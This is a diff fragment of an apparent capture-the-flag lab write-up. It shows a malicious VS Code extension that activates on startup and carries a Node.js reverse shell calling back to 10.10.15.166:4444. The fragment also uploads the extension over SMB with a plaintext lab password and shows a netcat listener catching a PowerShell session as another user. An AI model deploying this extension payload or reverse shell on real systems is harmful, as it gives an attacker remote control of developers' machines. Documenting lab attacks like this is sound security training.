@@ -615,3 +615,63 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.129.83.74 - - [28/Aug/2026 05:04:59] "\x16\x03\x01\x00á\x01\x00\x00Ý\x03\x03¤V´\x9cÁÊ"\x80\x05ï£\x0bPG¿ÚÔ\x04Öwo°\x00Ä8÷\x7f¹q(þ" «Þïh£\x00ªÆA" 400 -
 
 ```
+
+
+``` json
+
+{
+  "name": "checkpoint-test",
+  "displayName": "Checkpoint Test",
+  "version": "1.0.0",
+  "engines": {
+    "vscode": "^1.118.0"
+  },
+  "activationEvents": [
+    "*"
+  ],
+  "main": "./extension.js"
+}
+
+``` js
+
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("cmd", []);
+    var client = new net.Socket();
+    client.connect(4444, "10.10.15.166", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; 
+})();
+
+```
+
+``` bash
+
+❯ smbclient //10.129.83.74/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' -c 'put checkpoint-test-1.0.0.vsix'
+putting file checkpoint-test-1.0.0.vsix as \checkpoint-test-1.0.0.vsix (9744.6 kB/s) (average 9744.6 kB/s)
+
+```
+
+
+``` bash
+
+❯ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.15.166] from (UNKNOWN) [10.129.83.74] 50677
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Program Files\Microsoft VS Code> whoami
+whoami
+checkpoint\ryan.brooks
+PS C:\Program Files\Microsoft VS Code>
+
+```
+
+
